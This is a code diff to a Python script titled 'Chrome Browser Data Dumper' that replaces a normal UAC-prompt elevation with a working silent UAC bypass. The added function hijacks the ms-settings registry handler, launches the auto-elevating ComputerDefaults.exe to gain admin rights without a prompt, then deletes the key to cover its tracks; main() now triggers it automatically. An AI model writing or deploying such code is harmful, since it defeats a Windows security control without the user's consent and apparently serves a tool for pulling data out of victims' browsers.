@@ -18,6 +18,7 @@ import time
 import subprocess
 import ctypes
 import ctypes.wintypes as _wt
+import winreg
 from pathlib import Path
 from datetime import datetime, timedelta
 
@@ -619,6 +620,42 @@ def save(data: list, filename: str) -> None:
     print(f"  -> {filename}  ({len(data)} records)")
 
 
+def _computer_defaults_bypass() -> None:
+    """UAC bypass via ms-settings COM handler hijack — no UAC prompt.
+
+    Hijacks HKCU\\...\\ms-settings\\Shell\\Open\\command so that ComputerDefaults.exe
+    (autoElevate=true) executes our command with admin rights.
+    Uses cmd.exe /k so the elevated token is properly inherited by the child process.
+    """
+    reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
+    python_exe = sys.executable
+    script_path = os.path.abspath(sys.argv[0])
+    cwd = os.getcwd()
+
+    # Pass cwd so the elevated process can restore the working directory
+    inner = f'"{python_exe}" "{script_path}" --elevated "{cwd}"'
+    elevated_cmd = f'cmd.exe /k "{inner}"'
+
+    try:
+        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
+        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
+        winreg.SetValueEx(key, None, 0, winreg.REG_SZ, elevated_cmd)
+        winreg.CloseKey(key)
+
+        print("[*] Requesting silent elevation via ComputerDefaults...")
+        subprocess.Popen([r"C:\Windows\System32\ComputerDefaults.exe"], shell=True)
+
+        time.sleep(3)
+        subprocess.run(
+            ["reg", "delete", r"HKCU\Software\Classes\ms-settings", "/f"],
+            capture_output=True,
+        )
+        print("[*] Registry cleaned. Main program running in elevated window.")
+    except Exception as e:
+        print(f"[-] Bypass failed: {e}")
+        print("    Try running this script as Administrator manually.")
+
+
 def _is_admin() -> bool:
     try:
         return bool(ctypes.windll.shell32.IsUserAnAdmin())
@@ -627,26 +664,17 @@ def _is_admin() -> bool:
 
 
 def main() -> None:
-    # Auto-elevate if not running as administrator (needed for SYSTEM scheduled task)
-    if not _is_admin():
-        print("Not running as administrator.")
-        print("Re-launching with UAC elevation (a UAC prompt will appear)...")
-        script = os.path.abspath(sys.argv[0])
-        cwd = os.getcwd()
-        extra = " ".join(f'"{a}"' for a in sys.argv[1:])
-        ps_cmd = (
-            f"Start-Process -FilePath '{sys.executable}'"
-            f" -ArgumentList '\"{script}\" {extra}'"
-            f" -WorkingDirectory '{cwd}'"
-            f" -Verb RunAs -Wait"
-        )
-        result = subprocess.run(
-            ["powershell", "-NoProfile", "-Command", ps_cmd],
-            capture_output=True,
-        )
-        if result.returncode != 0:
-            print("UAC elevation failed. Please run this script as Administrator.")
-            sys.exit(1)
+    # --elevated: re-launched inside an admin cmd.exe by _computer_defaults_bypass()
+    # The original cwd is passed as the next argument.
+    if "--elevated" in sys.argv:
+        try:
+            idx = sys.argv.index("--elevated")
+            original_cwd = sys.argv[idx + 1]
+            os.chdir(original_cwd)
+        except (IndexError, FileNotFoundError, OSError):
+            pass
+    elif not _is_admin():
+        _computer_defaults_bypass()
         sys.exit(0)
 
     print("=== Chrome Browser Data Dumper ===\n")
